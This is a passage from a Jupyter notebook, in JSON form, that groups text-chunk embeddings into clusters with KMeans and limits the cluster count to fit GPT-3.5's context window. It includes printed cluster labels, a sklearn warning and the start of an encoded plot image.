     "text": [
      "The number of clusters is too large which will exceeding the GPT 3.5 limitation of 16k. The number of clusters is set to 3.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/Users/haoxu/anaconda3/lib/python3.11/site-packages/sklearn/cluster/_kmeans.py:1412: FutureWarning: The default value of `n_init` will change from 10 to 'auto' in 1.4. Set the value of `n_init` explicitly to suppress the warning\n",
      "  super()._check_params_vs_input(X, default_n_init=10)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{0: 0, 1: 0, 2: 0, 3: 0, 4: 0, 5: 0, 6: 0, 7: 0, 8: 0, 9: 0, 10: 0, 11: 0, 12: 0, 13: 0, 14: 0, 15: 0, 16: 0, 17: 0, 18: 0, 19: 0, 20: 0, 21: 0, 22: 0, 23: 0, 24: 0, 25: 2, 26: 2, 27: 2, 28: 2, 29: 2, 30: 2, 31: 2, 32: 2, 33: 2, 34: 2, 35: 2, 36: 2, 37: 2, 38: 2, 39: 2, 40: 2, 41: 2, 42: 2, 43: 2, 44: 2, 45: 2, 46: 1, 47: 1, 48: 1, 49: 1, 50: 1, 51: 1, 52: 1, 53: 1, 54: 1, 55: 1, 56: 0, 57: 1, 58: 0, 59: 0, 60: 0, 61: 0, 62: 0, 63: 0, 64: 0, 65: 0, 66: 0, 67: 0}\n"
     ]
    }
   ],
   "source": [
    "import numpy as np\n",
    "from sklearn.cluster import KMeans\n",
    "\n",
    "vectors = np.array(vectors)\n",
    "\n",
    "num_clusters = 10\n",
    "if num_clusters*chunk_size >  63_000:\n",
    "    num_clusters = 63_000 // chunk_size\n",
    "    print(f\"The number of clusters is too large which will exceeding the GPT 3.5 limitation of 16k. The number of clusters is set to {num_clusters}.\")\n",
    "else:\n",
    "    print(f\"The number of clusters is set to {num_clusters}.\")\n",
    "\n",
    "kmeans = KMeans(n_clusters=num_clusters, random_state=42).fit(vectors)\n",
    "labels_dict = {index:label for index, label in enumerate(kmeans.labels_)}\n",
    "print(labels_dict)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "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